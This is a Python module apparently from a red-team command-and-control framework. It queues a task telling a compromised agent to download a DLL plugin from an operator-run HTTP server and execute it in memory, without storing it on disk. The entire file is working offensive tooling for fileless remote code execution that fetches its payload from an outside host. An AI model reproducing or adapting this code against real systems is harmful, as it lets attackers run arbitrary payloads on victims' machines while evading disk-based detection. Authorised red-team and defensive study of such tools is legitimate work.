from modules._module import AgentModule
from utils.custom_print import print_info, print_error, print_ok
from utildata.dataset_options import Option
from utils.redteam_db import RedTeamDB
import multiprocessing
from http.server import BaseHTTPRequestHandler, HTTPServer
from os import kill, walk
import signal
from time import sleep
import socket
import requests
from utils.shell_options import ShellOptions
from utils.check_agent import is_agent_alive


class RedTeamModule(AgentModule):

    def __init__(self):
        information = {"Name": "Load and Execute a plugin",
                       "Description": "With this module you will be able to load a dll and run it. Plugins are not stored on disk.",
                       "Requirements": "It's neccessary configure a web server. Example: Python -m SimpleHTTPServer [port]",
                       "Author": "@josueencinar"}


        hostname = socket.gethostname()    
        ip = socket.gethostbyname(hostname) 

        options =  {
             "lhost": Option.create(name="lhost", value=ip, required=True),
            "lport": Option.create(name="lport", value=8000, required=True),
            "plugin": Option.create(name="plugin", description="Plugin to execute", required=True)
            }
        self.localport = 0
        # Constructor of the parent class
        super(RedTeamModule, self).__init__(information, options)

    # Autocomplete set option with values 
    # TODO: Improve this autocomplete agent   
    def update_complete_set(self):
        s_options = ShellOptions.get_instance()
        plugins = []
        for (p, d, files) in walk("plugins/simple"):
            for f in files:
                plugins.append(f.replace(".dll", ""))

        s_options.add_set_option_values("plugin", plugins)

    @is_agent_alive
    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.args['lhost'], int(self.args['lport'])))
            if result == 0:
                print_info("First the plugin is loaded into memory and then it is executed")
                rt_db = RedTeamDB.get_instance()
                args = f"http://{self.args['lhost']}:{self.args['lport']}/simple/ {self.args['plugin']}"
                rt_db.add_task(self.args["agent"], "LoadPlugin", args, "", "function")
            else:
                print_error("The server is not running...")
                print_info(f"Launches the following command on the desired route (plugins in this case): python -m SimpleHTTPServer {self.args['lport']}")
        except Exception as e:
            print_error(e)
            return
        
        

